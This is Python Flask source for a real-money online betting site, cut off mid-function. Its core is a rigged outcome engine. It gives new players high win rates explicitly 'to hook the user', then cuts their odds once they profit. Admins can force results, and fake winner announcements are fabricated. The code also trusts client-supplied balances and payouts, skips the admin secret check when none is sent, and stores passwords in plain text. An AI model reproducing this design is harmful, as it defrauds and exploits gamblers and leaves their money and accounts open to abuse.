import hashlib
import os
import random
import subprocess
import sys
import time
import threading
import requests
from dotenv import load_dotenv
from flask import (
    Flask,
    jsonify,
    render_template,
    request,
    send_from_directory,
    session,
)
import psycopg2
from psycopg2.extras import RealDictCursor
from waitress import serve
import telebot

load_dotenv()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "oom_tyre_secret_key")

# Direct PostgreSQL connection string
DB_URL = "postgresql://postgres:1234@localhost:5432/oomtyre"
MINIMUM_BET = 100.0  # Minimum Bet Rule Set to ₹100
ADMIN_SECRET = "SUPER_SECRET_KEY_123"  # Admin Secret Token

# --- TELEGRAM BOT CONFIGURATION ---
ADMIN_BOT_TOKEN = os.getenv("ADMIN_BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN_HERE")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "YOUR_CHAT_ID_HERE")
bot = telebot.TeleBot(ADMIN_BOT_TOKEN)
BACKEND_BASE_URL = "http://127.0.0.1:5000"
BACKEND_URL = f"{BACKEND_BASE_URL}/api/admin/set_control"

# Mapping color choices to outcome options in sub-folders
COLOR_VIDEOS = {
    "red": ["redcenter.mp4", "redleft.mp4", "redright.mp4"],
    "green": ["greencenter.mp4", "greenleft.mp4", "greenright.mp4"],
    "blue": ["bluecenter.mp4", "blueleft.mp4", "blueright.mp4"],
}

# Flat outcome video list for random select
ALL_OUTCOME_VIDEOS = [
    "bluecenter.mp4", "blueleft.mp4", "blueright.mp4",
    "redcenter.mp4", "redleft.mp4", "redright.mp4",
    "greencenter.mp4", "greenleft.mp4", "greenright.mp4"
]

# Global Master Admin Controls
admin_settings = {
    "global_win_rate": 0.25,  # 25% Base RTP
    "emergency_lock": False,  # Forced Loss Mode
    "forced_outcome": None,  # Admin Override Outcome
}

last_round_winner = {"color": None}


def get_db():
    return psycopg2.connect(DB_URL, cursor_factory=RealDictCursor)


def init_db():
    try:
        conn = get_db()
        cursor = conn.cursor()

        # Users Table
        cursor.execute(
            """CREATE TABLE IF NOT EXISTS users (
            username VARCHAR(100) PRIMARY KEY,
            password VARCHAR(255),
            balance DOUBLE PRECISION DEFAULT 0.0,
            total_spins INTEGER DEFAULT 0,
            total_wagered DOUBLE PRECISION DEFAULT 0.0,
            total_won DOUBLE PRECISION DEFAULT 0.0,
            consecutive_losses INTEGER DEFAULT 0,
            referral_code VARCHAR(20) UNIQUE,
            referred_by VARCHAR(100),
            last_daily_claim TIMESTAMP,
            user_ip VARCHAR(45)
        )"""
        )

        # Bets Table
        cursor.execute(
            """CREATE TABLE IF NOT EXISTS bets (
            id SERIAL PRIMARY KEY,
            username VARCHAR(100),
            color VARCHAR(20),
            amount DOUBLE PRECISION,
            status VARCHAR(20) DEFAULT 'pending',
            client_seed VARCHAR(64),
            server_hash VARCHAR(64)
        )"""
        )

        # Financial Transactions
        cursor.execute(
            """CREATE TABLE IF NOT EXISTS transactions (
            id SERIAL PRIMARY KEY,
            username VARCHAR(100),
            type VARCHAR(20),
            amount DOUBLE PRECISION,
            status VARCHAR(20) DEFAULT 'pending',
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )"""
        )

        # Daily House Stats Table
        cursor.execute(
            """CREATE TABLE IF NOT EXISTS daily_house_stats (
            date DATE PRIMARY KEY DEFAULT CURRENT_DATE,
            total_wagered DOUBLE PRECISION DEFAULT 0.0,
            total_payout DOUBLE PRECISION DEFAULT 0.0
        )"""
        )

        conn.commit()
        cursor.close()
        conn.close()
        print("✅ Database initialized successfully!")
    except Exception as e:
        print("❌ DB Init Error:", e)


init_db()


# =====================================================================
# --- CENTRAL SMART RISK & DOPAMINE ALGORITHM (ALL GAMES) ---
# =====================================================================
def calculate_user_win_probability(user_data):
    if not user_data:
        return admin_settings["global_win_rate"]

    if admin_settings["emergency_lock"]:
        return 0.0  # 100% Loss Mode (Emergency)

    balance = float(user_data.get("balance", 0.0))
    wagered = float(user_data.get("total_wagered", 0.0))
    won = float(user_data.get("total_won", 0.0))
    net_profit = won - wagered
    spins = user_data.get("total_spins", 0)
    losses = user_data.get("consecutive_losses", 0)

    # 1. HARDCORE HOUSE PROTECTION (Profit >= ₹1000 or Balance >= ₹2500)
    if net_profit >= 1000.0 or balance >= 2500.0:
        return 0.08  # 8% win rate (Hard level, house protects profit)

    # 2. MEDIUM CHALLENGE STAGE (Profit between ₹500 and ₹1000)
    elif net_profit >= 500.0:
        return 0.20  # 20% win rate (Moderate/Hard tier)

    # 3. INITIAL DOPAMINE HIT STAGE (First ₹500-₹600 winning / Starting Phase)
    elif net_profit < 500.0 and spins <= 15:
        return 0.75  # 75% high win rate to hook the user with easy wins!

    # 4. CONFIDENCE BOOSTER / RECOVERY HOOK (After 2+ losses)
    elif losses >= 2 and net_profit < 800:
        return 0.55  # 55% chance to give a small win & restore confidence

    # Default fallback win rate
    return admin_settings["global_win_rate"]


# --- HELPER FUNCTION FOR DAILY HOUSE STATS ---
def update_daily_stats(amount, payout=0.0):
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute(
            """
            INSERT INTO daily_house_stats (date, total_wagered, total_payout)
            VALUES (CURRENT_DATE, %s, %s)
            ON CONFLICT (date) DO UPDATE 
            SET total_wagered = daily_house_stats.total_wagered + EXCLUDED.total_wagered,
                total_payout = daily_house_stats.total_payout + EXCLUDED.total_payout
        """,
            (amount, payout),
        )
        conn.commit()
        cursor.close()
        conn.close()
    except Exception as e:
        print("Error updating daily stats:", e)


# =====================================================================
# --- DYNAMIC VIDEO SERVING ROUTES ---
# =====================================================================
@app.route("/video/<path:filename>")
def serve_video(filename):
    return send_from_directory(BASE_DIR, filename)

@app.route("/spinvideos/<filename>")
def serve_spin_video(filename):
    return send_from_directory(os.path.join(BASE_DIR, "spinvideos"), filename)

@app.route("/bluevideos/<filename>")
def serve_blue_video(filename):
    return send_from_directory(os.path.join(BASE_DIR, "bluevideos"), filename)

@app.route("/redvideos/<filename>")
def serve_red_video(filename):
    return send_from_directory(os.path.join(BASE_DIR, "redvideos"), filename)

@app.route("/greenvideos/<filename>")
def serve_green_video(filename):
    return send_from_directory(os.path.join(BASE_DIR, "greenvideos"), filename)


# --- PAGE ROUTING SYSTEM ---
@app.route("/")
def home():
    return render_template("lobby.html")

@app.route("/game/tyre")
def tyre_game():
    return render_template("index.html")

@app.route("/game/chicken")
def chicken_game():
    return render_template("chicken.html")

@app.route("/game/parity")
def parity_game():
    return render_template("parity.html")

@app.route("/game/aviator")
def aviator_game():
    return render_template("aviator.html")

@app.route("/game/mines")
def mines_game():
    return render_template("mines.html")

@app.route("/game/roulette")
def roulette_game():
    return render_template("roulette.html")


# --- AUTH & USER API ---
@app.route("/login", methods=["POST"])
def login():
    data = request.json or {}
    username = data.get("username")
    password = data.get("password")
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT * FROM users WHERE username = %s AND password = %s",
        (username, password),
    )
    user = cursor.fetchone()

    if user:
        cursor.execute(
            "UPDATE users SET user_ip = %s WHERE username = %s",
            (user_ip, username),
        )
        conn.commit()
        session["user"] = username
        cursor.close()
        conn.close()
        return jsonify(
            {
                "status": "success",
                "username": username,
                "balance": float(user["balance"]),
            }
        )

    cursor.close()
    conn.close()
    return jsonify(
        {"status": "error", "message": "Galat Username ya Password!"}
    )


# --- WALLET & ACTIVE BET STATE SYNC API ---
@app.route("/api/balance", methods=["GET"])
def api_balance():
    if "user" not in session:
        return jsonify({"success": False, "message": "Unauthorized"}), 401

    username = session["user"]
    conn = get_db()
    cursor = conn.cursor()
    
    cursor.execute("SELECT balance FROM users WHERE username = %s", (username,))
    user = cursor.fetchone()
    
    cursor.execute(
        "SELECT id, color, amount FROM bets WHERE username = %s AND status = 'pending' ORDER BY id DESC LIMIT 1",
        (username,),
    )
    active_bet = cursor.fetchone()
    
    cursor.close()
    conn.close()

    if user:
        bet_data = None
        if active_bet:
            bet_data = {
                "id": active_bet["id"],
                "color": active_bet["color"],
                "amount": float(active_bet["amount"])
            }
        return jsonify({
            "success": True, 
            "balance": float(user["balance"]),
            "active_bet": bet_data,
            "last_winner": last_round_winner.get("color")
        })
        
    return jsonify({"success": False, "message": "User not found"}), 404


@app.route("/api/update-balance", methods=["POST"])
def update_balance():
    data = request.json or {}
    new_balance = data.get("balance")

    if "user" in session and new_balance is not None:
        username = session["user"]
        conn = get_db()
        cursor = conn.cursor()
        try:
            cursor.execute(
                "UPDATE users SET balance = %s WHERE username = %s",
                (float(new_balance), username),
            )
            conn.commit()
        except Exception as e:
            conn.rollback()
            print("Error updating balance:", e)
        finally:
            cursor.close()
            conn.close()

    return jsonify({"success": True})


# --- PARITY GAME BACKEND ENGINE ---
@app.route("/api/parity/place_bet", methods=["POST"])
def parity_place_bet():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login Required!"}), 401

    data = request.json or {}
    choice = data.get("choice")
    try:
        amount = float(data.get("amount", 0))
    except (ValueError, TypeError):
        return jsonify({"status": "error", "message": "Invalid amount!"})

    username = session["user"]

    if amount < MINIMUM_BET:
        return jsonify({
            "status": "error",
            "message": f"Minimum bet amount ₹{int(MINIMUM_BET)} honi chahiye!"
        })

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute("SELECT balance FROM users WHERE username = %s FOR UPDATE", (username,))
        user = cursor.fetchone()

        if not user or float(user["balance"]) < amount:
            cursor.execute("ROLLBACK")
            return jsonify({"status": "error", "message": "Insufficient balance!"})

        cursor.execute(
            "UPDATE users SET balance = balance - %s, total_wagered = total_wagered + %s WHERE username = %s",
            (amount, amount, username)
        )
        cursor.execute(
            "INSERT INTO bets (username, color, amount, status) VALUES (%s, %s, %s, 'pending')",
            (username, f"parity_{choice}", amount)
        )
        conn.commit()
        update_daily_stats(amount=amount, payout=0.0)

        cursor.execute("SELECT balance FROM users WHERE username = %s", (username,))
        updated = cursor.fetchone()
        return jsonify({"status": "success", "balance": float(updated["balance"])})

    except Exception as e:
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)})
    finally:
        cursor.close()
        conn.close()


@app.route("/api/verify-telegram-user", methods=["POST"])
def verify_telegram_user():
    data = request.json or {}
    username = data.get("username")
    password = data.get("password")
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT * FROM users WHERE username = %s AND password = %s",
        (username, password),
    )
    user = cursor.fetchone()

    if user:
        cursor.execute(
            "UPDATE users SET user_ip = %s WHERE username = %s",
            (user_ip, username),
        )
        conn.commit()
        session["user"] = username
        bal = float(user["balance"])
        cursor.close()
        conn.close()
        return jsonify(
            {"status": "success", "success": True, "balance": bal}
        )

    cursor.close()
    conn.close()
    return jsonify(
        {
            "status": "error",
            "success": False,
            "message": "Invalid Username or Password!",
        }
    )


@app.route("/place_bet", methods=["POST"])
def place_bet():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Pehle Login Karein!"})

    data = request.json or {}
    color = data.get("color")
    amount = float(data.get("amount", 0))
    username = session["user"]

    if amount < MINIMUM_BET:
        return jsonify(
            {
                "status": "error",
                "message": f"Minimum bet amount ₹{int(MINIMUM_BET)} honi chahiye!",
            }
        )

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        
        cursor.execute(
            "SELECT id FROM bets WHERE username = %s AND status = 'pending'",
            (username,)
        )
        if cursor.fetchone():
            cursor.execute("ROLLBACK")
            cursor.close()
            conn.close()
            return jsonify({"status": "error", "message": "Aapki bet pehle se placed hai!"})

        cursor.execute(
            "SELECT balance, total_spins, total_wagered FROM users WHERE username = %s FOR UPDATE",
            (username,),
        )
        user = cursor.fetchone()

        if not user:
            cursor.execute("ROLLBACK")
            cursor.close()
            conn.close()
            return jsonify({"status": "error", "message": "User nahi mila!"})

        current_bal = float(user["balance"] or 0.0)
        if current_bal < amount:
            cursor.execute("ROLLBACK")
            cursor.close()
            conn.close()
            return jsonify({"status": "error", "message": "Balance Kam Hai!"})

        server_seed = str(time.time()) + str(random.random())
        server_hash = hashlib.sha256(server_seed.encode()).hexdigest()

        new_spins = user["total_spins"] + 1
        new_wagered = float(user["total_wagered"] or 0.0) + amount

        cursor.execute(
            "UPDATE users SET balance = balance - %s, total_spins = %s, total_wagered = %s WHERE username = %s",
            (amount, new_spins, new_wagered, username),
        )

        cursor.execute(
            "INSERT INTO bets (username, color, amount, status, server_hash) VALUES (%s, %s, %s, 'pending', %s)",
            (username, color, amount, server_hash),
        )

        conn.commit()

        cursor.execute(
            "SELECT balance FROM users WHERE username = %s", (username,)
        )
        updated_user = cursor.fetchone()
        cursor.close()
        conn.close()

        update_daily_stats(amount=amount, payout=0.0)

        return jsonify(
            {
                "status": "success",
                "placed_bet": {"color": color, "amount": amount},
                "new_balance": float(updated_user["balance"]),
                "provably_fair_hash": server_hash,
            }
        )
    except Exception as e:
        conn.rollback()
        cursor.close()
        conn.close()
        print("❌ Place Bet Error:", e)
        return jsonify({"status": "error", "message": "Transaction error, please try again."})


# --- UPDATED GET_GAME_STATE (Delayed Balance Update) ---
@app.route("/get_game_state")
def get_game_state():
    global last_round_winner
    conn = get_db()
    cursor = conn.cursor()

    chosen = None

    if admin_settings["emergency_lock"]:
        chosen = random.choice(ALL_OUTCOME_VIDEOS)
    elif admin_settings["forced_outcome"]:
        target_color = admin_settings["forced_outcome"].lower()
        if target_color in COLOR_VIDEOS:
            chosen = random.choice(COLOR_VIDEOS[target_color])
        admin_settings["forced_outcome"] = None

    is_user_win = False
    bet_amount = 0.0

    if "user" in session:
        username = session["user"]
        try:
            cursor.execute("BEGIN")
            cursor.execute(
                "SELECT * FROM users WHERE username = %s FOR UPDATE", (username,)
            )
            user = cursor.fetchone()

            if user:
                cursor.execute(
                    "SELECT id, color, amount FROM bets WHERE username = %s AND status = 'pending' ORDER BY id DESC LIMIT 1",
                    (username,),
                )
                last_bet = cursor.fetchone()

                if last_bet:
                    bet_id = last_bet["id"]
                    bet_color = last_bet["color"].lower()
                    bet_amount = float(last_bet["amount"])

                    if bet_color in COLOR_VIDEOS:
                        win_prob = calculate_user_win_probability(user)

                        if not chosen:
                            if random.random() < win_prob:
                                chosen = random.choice(COLOR_VIDEOS[bet_color])
                            else:
                                other_colors = [c for c in COLOR_VIDEOS.keys() if c != bet_color]
                                losing_color = random.choice(other_colors)
                                chosen = random.choice(COLOR_VIDEOS[losing_color])

                        is_win = any(chosen in COLOR_VIDEOS[bet_color] for _ in [0])
                        is_user_win = is_win  # Frontend ko bhejne ke liye

                        if is_win:
                            cursor.execute(
                                "UPDATE bets SET status = 'won' WHERE id = %s",
                                (bet_id,),
                            )
                        else:
                            cursor.execute(
                                """
                                UPDATE users 
                                SET consecutive_losses = consecutive_losses + 1 
                                WHERE username = %s
                                """,
                                (username,),
                            )
                            cursor.execute(
                                "UPDATE bets SET status = 'lost' WHERE id = %s",
                                (bet_id,),
                            )

                    conn.commit()
        except Exception as e:
            conn.rollback()
            print("❌ Game State Error:", e)

    if not chosen:
        chosen = random.choice(ALL_OUTCOME_VIDEOS)

    if "red" in chosen:
        winning_color = "RED"
    elif "blue" in chosen:
        winning_color = "BLUE"
    elif "green" in chosen:
        winning_color = "GREEN"
    else:
        winning_color = "UNKNOWN"

    last_round_winner["color"] = winning_color

    current_bal = 0.0
    if "user" in session:
        cursor.execute(
            "SELECT balance FROM users WHERE username = %s", (session["user"],)
        )
        u = cursor.fetchone()
        if u:
            current_bal = float(u["balance"])

    cursor.close()
    conn.close()

    return jsonify(
        {
            "game": {"outcome": chosen},
            "outcome": chosen,
            "winning_color": winning_color,
            "is_win": is_user_win,
            "bet_amount": bet_amount,
            "bet_status": "CLOSED",
            "winRate": admin_settings["global_win_rate"],
            "balance": current_bal,
        }
    )


# --- NEW API TO CLAIM WINNINGS AFTER ANNOUNCEMENT ---
@app.route("/api/claim_win", methods=["POST"])
def claim_win():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})
    
    data = request.json or {}
    try:
        bet_amount = float(data.get("bet_amount", 0))
    except (ValueError, TypeError):
        bet_amount = 0.0

    username = session["user"]
    payout_amount = bet_amount * 2.5

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            """
            UPDATE users 
            SET balance = balance + %s, 
                total_won = total_won + %s, 
                consecutive_losses = 0 
            WHERE username = %s
            """,
            (payout_amount, payout_amount, username),
        )
        conn.commit()
        update_daily_stats(amount=0.0, payout=payout_amount)

        cursor.execute("SELECT balance FROM users WHERE username = %s", (username,))
        u = cursor.fetchone()
        new_bal = float(u["balance"]) if u else 0.0

        cursor.close()
        conn.close()
        return jsonify({"status": "success", "new_balance": new_bal, "payout": payout_amount})
    except Exception as e:
        conn.rollback()
        cursor.close()
        conn.close()
        return jsonify({"status": "error", "message": str(e)})


# --- UPDATED AVIATOR MULTIPLIER LOGIC (DOPAMINE & WIN PROB SYNCED) ---
def calculate_aviator_crash_point(username=None):
    win_prob = admin_settings["global_win_rate"]
    
    if username:
        try:
            conn = get_db()
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
            user = cursor.fetchone()
            cursor.close()
            conn.close()
            if user:
                win_prob = calculate_user_win_probability(user)
        except Exception as e:
            print("Aviator Prob Calc Error:", e)

    # Agar win probability high hai (Dopamine / Confidence stage) -> Acha multiplier do (2x - 5.2x)
    if win_prob >= 0.70:
        return round(2.00 + random.random() * 3.20, 2)
    # Agar house protection ya hard stage hai -> Low multiplier crash (1.0x - 1.2x)
    elif win_prob <= 0.10:
        return round(1.00 + random.random() * 0.15, 2)
    elif win_prob <= 0.25:
        return round(1.05 + random.random() * 0.45, 2)
    else:
        # Mix of medium multipliers for engagement
        r = random.random()
        if r < 0.4:
            return round(1.20 + random.random() * 0.80, 2)
        else:
            return round(2.01 + random.random() * 4.50, 2)


@app.route("/api/aviator/crash_point", methods=["GET"])
def aviator_crash_point_api():
    username = session.get("user")
    crash_pt = calculate_aviator_crash_point(username)
    return jsonify({"status": "success", "crash_point": crash_pt})


@app.route("/api/aviator/cashout", methods=["POST"])
def aviator_cashout():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})

    data = request.json or {}
    winnings = float(data.get("winnings", 0))
    username = session["user"]

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute("SELECT username FROM users WHERE username = %s FOR UPDATE", (username,))

        cursor.execute(
            "UPDATE bets SET status = 'won' WHERE username = %s AND color = 'aviator' AND status = 'pending'",
            (username,),
        )
        cursor.execute(
            "UPDATE users SET balance = balance + %s, total_won = total_won + %s, consecutive_losses = 0 WHERE username = %s",
            (winnings, winnings, username),
        )
        conn.commit()
        update_daily_stats(amount=0.0, payout=winnings)
    except Exception as e:
        conn.rollback()
        print("❌ Aviator Cashout Error:", e)

    cursor.execute("SELECT balance FROM users WHERE username = %s", (username,))
    u = cursor.fetchone()
    new_bal = float(u["balance"]) if u else 0.0

    cursor.close()
    conn.close()
    return jsonify({"status": "success", "balance": new_bal})


@app.route("/api/aviator/crash", methods=["POST"])
def aviator_crash():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})

    username = session["user"]
    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute("SELECT username FROM users WHERE username = %s FOR UPDATE", (username,))

        cursor.execute(
            "UPDATE bets SET status = 'lost' WHERE username = %s AND color = 'aviator' AND status = 'pending'",
            (username,),
        )
        cursor.execute(
            "UPDATE users SET consecutive_losses = consecutive_losses + 1 WHERE username = %s",
            (username,),
        )
        conn.commit()
    except Exception as e:
        conn.rollback()
        print("❌ Aviator Crash Error:", e)

    cursor.close()
    conn.close()
    return jsonify({"status": "success"})


@app.route("/api/mines/start", methods=["POST"])
def mines_start():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})
    data = request.json or {}
    amount = float(data.get("amount", 0))
    username = session["user"]

    if amount < 10:
        return jsonify({"status": "error", "message": "Minimum bet is ₹10"})

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute("SELECT balance FROM users WHERE username = %s FOR UPDATE", (username,))
        user = cursor.fetchone()
        if not user or float(user["balance"]) < amount:
            cursor.execute("ROLLBACK")
            return jsonify({"status": "error", "message": "Insufficient balance"})

        cursor.execute(
            "UPDATE users SET balance = balance - %s, total_spins = total_spins + 1, total_wagered = total_wagered + %s WHERE username = %s",
            (amount, amount, username),
        )
        cursor.execute(
            "INSERT INTO bets (username, color, amount, status) VALUES (%s, 'mines', %s, 'pending')",
            (username, amount),
        )
        conn.commit()

        cursor.execute("SELECT balance FROM users WHERE username = %s", (username,))
        updated = cursor.fetchone()
        return jsonify({"status": "success", "balance": float(updated["balance"])})
    except Exception as e:
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)})
    finally:
        cursor.close()
        conn.close()


@app.route("/api/mines/cashout", methods=["POST"])
def mines_cashout():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})
    data = request.json or {}
    winnings = float(data.get("winnings", 0))
    username = session["user"]

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "UPDATE users SET balance = balance + %s, total_won = total_won + %s, consecutive_losses = 0 WHERE username = %s",
            (winnings, winnings, username),
        )
        cursor.execute(
            "UPDATE bets SET status = 'won' WHERE username = %s AND color = 'mines' AND status = 'pending'",
            (username,),
        )
        conn.commit()
        update_daily_stats(amount=0.0, payout=winnings)

        cursor.execute("SELECT balance FROM users WHERE username = %s", (username,))
        updated = cursor.fetchone()
        return jsonify({"status": "success", "balance": float(updated["balance"])})
    except Exception as e:
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)})
    finally:
        cursor.close()
        conn.close()


@app.route("/api/mines/loss", methods=["POST"])
def mines_loss():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})
    username = session["user"]

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "UPDATE users SET consecutive_losses = consecutive_losses + 1 WHERE username = %s",
            (username,),
        )
        cursor.execute(
            "UPDATE bets SET status = 'lost' WHERE username = %s AND color = 'mines' AND status = 'pending'",
            (username,),
        )
        conn.commit()

        cursor.execute("SELECT balance FROM users WHERE username = %s", (username,))
        updated = cursor.fetchone()
        return jsonify({"status": "success", "balance": float(updated["balance"])})
    except Exception as e:
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)})
    finally:
        cursor.close()
        conn.close()


@app.route("/api/chicken/start", methods=["POST"])
def chicken_start():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})
    data = request.json or {}
    amount = float(data.get("amount", 0))
    username = session["user"]

    if amount < 10:
        return jsonify({"status": "error", "message": "Minimum bet is ₹10"})

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute("SELECT balance FROM users WHERE username = %s FOR UPDATE", (username,))
        user = cursor.fetchone()
        if not user or float(user["balance"]) < amount:
            cursor.execute("ROLLBACK")
            return jsonify({"status": "error", "message": "Insufficient balance"})

        cursor.execute(
            "UPDATE users SET balance = balance - %s, total_spins = total_spins + 1, total_wagered = total_wagered + %s WHERE username = %s",
            (amount, amount, username),
        )
        cursor.execute(
            "INSERT INTO bets (username, color, amount, status) VALUES (%s, 'chicken', %s, 'pending')",
            (username, amount),
        )
        conn.commit()

        cursor.execute("SELECT balance FROM users WHERE username = %s", (username,))
        updated = cursor.fetchone()
        return jsonify({"status": "success", "balance": float(updated["balance"])})
    except Exception as e:
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)})
    finally:
        cursor.close()
        conn.close()


@app.route("/api/chicken/cashout", methods=["POST"])
def chicken_cashout():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})
    data = request.json or {}
    winnings = float(data.get("winnings", 0))
    username = session["user"]

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "UPDATE users SET balance = balance + %s, total_won = total_won + %s, consecutive_losses = 0 WHERE username = %s",
            (winnings, winnings, username),
        )
        cursor.execute(
            "UPDATE bets SET status = 'won' WHERE username = %s AND color = 'chicken' AND status = 'pending'",
            (username,),
        )
        conn.commit()
        update_daily_stats(amount=0.0, payout=winnings)

        cursor.execute("SELECT balance FROM users WHERE username = %s", (username,))
        updated = cursor.fetchone()
        return jsonify({"status": "success", "balance": float(updated["balance"])})
    except Exception as e:
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)})
    finally:
        cursor.close()
        conn.close()


@app.route("/api/chicken/loss", methods=["POST"])
def chicken_loss():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})
    username = session["user"]

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "UPDATE users SET consecutive_losses = consecutive_losses + 1 WHERE username = %s",
            (username,),
        )
        cursor.execute(
            "UPDATE bets SET status = 'lost' WHERE username = %s AND color = 'chicken' AND status = 'pending'",
            (username,),
        )
        conn.commit()

        cursor.execute("SELECT balance FROM users WHERE username = %s", (username,))
        updated = cursor.fetchone()
        return jsonify({"status": "success", "balance": float(updated["balance"])})
    except Exception as e:
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)})
    finally:
        cursor.close()
        conn.close()


@app.route("/api/live_activity", methods=["GET", "POST"])
def live_activity():
    if request.method == "POST":
        data = request.json or {}
        return jsonify({"status": "success", "data": data})

    fake_users = [
        "Rahul_9X", "Aman_K", "Vikas_Pro", "Rohan_Winner",
        "Priya_77", "Lucky_S", "Alex_77", "Karan_01",
    ]
    fake_colors = ["RED", "BLUE", "GREEN"]
    multiplier = 2.5
    amount = random.choice([200, 500, 1000, 2500, 5000])

    user = random.choice(fake_users)
    color = random.choice(fake_colors)
    payout = amount * multiplier

    data = {
        "status": "success",
        "username": user,
        "color": color,
        "amount": amount,
        "payout": payout,
        "message": f"🔥 {user} placed ₹{amount} on {color} (Won ₹{payout})!",
    }
    return jsonify(data)


@app.route("/api/admin/set_control", methods=["POST"])
def admin_set_control():
    data = request.json or {}

    if data.get("secret") and data.get("secret") != ADMIN_SECRET:
        return (
            jsonify(
                {
                    "success": False,
                    "status": "error",
                    "message": "Unauthorized request",
                }
            ),
            403,
        )

    if "win_rate" in data:
        admin_settings["global_win_rate"] = float(data["win_rate"])
    elif "winRate" in data:
        val = float(data["winRate"])
        admin_settings["global_win_rate"] = val / 100.0 if val > 1 else val

    if "emergency_lock" in data:
        admin_settings["emergency_lock"] = bool(data["emergency_lock"])
    if "force_outcome" in data:
        admin_settings["forced_outcome"] = str(data["force_outcome"])

    return jsonify(
        {
            "status": "success",
            "success": True,
            "settings": admin_settings,
            "message": f"Win rate updated to {admin_settings['global_win_rate'] * 100}%",
        }
    )


# --- HOUSE STATS API ROUTE FOR BOT /house COMMAND ---
@app.route("/api/admin/house_stats", methods=["GET"])
def admin_house_stats():
    secret = request.args.get("secret")
    if secret != ADMIN_SECRET:
        return jsonify({"status": "error", "message": "Unauthorized"}), 403

    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("SELECT total_wagered, total_payout FROM daily_house_stats WHERE date = CURRENT_DATE")
        row = cursor.fetchone()
        cursor.close()
        conn.close()

        wagered = float(row["total_wagered"]) if row else 0.0
        payout = float(row["total_payout"]) if row else 0.0
        profit = wagered - payout

        return jsonify({
            "status": "success",
            "total_wagered": wagered,
            "total_payout": payout,
            "house_profit": profit
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


@app.route("/api/admin/create_user", methods=["POST"])
def admin_create_user():
    data = request.json or {}
    if data.get("secret") != ADMIN_SECRET:
        return jsonify({"status": "error", "message": "Unauthorized"}), 403

    username = data.get("username")
    password = data.get("password")
    initial_balance = float(data.get("balance", 0.0))

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute(
            "INSERT INTO users (username, password, balance) VALUES (%s, %s, %s)",
            (username, password, initial_balance),
        )
        conn.commit()
        msg = f"User '{username}' created successfully with balance ₹{initial_balance}!"
        status = "success"
    except Exception as e:
        conn.rollback()
        msg = f"Failed to create user: {str(e)}"
        status = "error"
    finally:
        cursor.close()
        conn.close()

    return jsonify({"status": status, "message": msg})


@app.route("/api/admin/update_balance", methods=["POST"])
def admin_update_balance():
    data = request.json or {}
    if data.get("secret") != ADMIN_SECRET:
        return jsonify({"status": "error", "message": "Unauthorized"}), 403

    username = data.get("username")
    action = data.get("action")

    try:
        amount = float(data.get("amount", 0.0))
    except (ValueError, TypeError):
        return jsonify(
            {"status": "error", "message": "Invalid amount format!"}
        )

    if amount <= 0:
        return jsonify(
            {"status": "error", "message": "Amount > 0 honi chahiye!"}
        )

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "SELECT balance FROM users WHERE username = %s FOR UPDATE", (username,)
        )
        user = cursor.fetchone()

        if not user:
            cursor.execute("ROLLBACK")
            cursor.close()
            conn.close()
            return jsonify({"status": "error", "message": "User nahi mila!"})

        current_bal = float(user["balance"] or 0.0)

        if action == "add":
            new_bal = current_bal + amount
        elif action == "deduct":
            if current_bal < amount:
                cursor.execute("ROLLBACK")
                cursor.close()
                conn.close()
                return jsonify(
                    {"status": "error", "message": "Insufficient user balance!"}
                )
            new_bal = current_bal - amount
        else:
            cursor.execute("ROLLBACK")
            cursor.close()
            conn.close()
            return jsonify({"status": "error", "message": "Invalid action!"})

        cursor.execute(
            "UPDATE users SET balance = %s WHERE username = %s",
            (new_bal, username),
        )
        conn.commit()
        cursor.close()
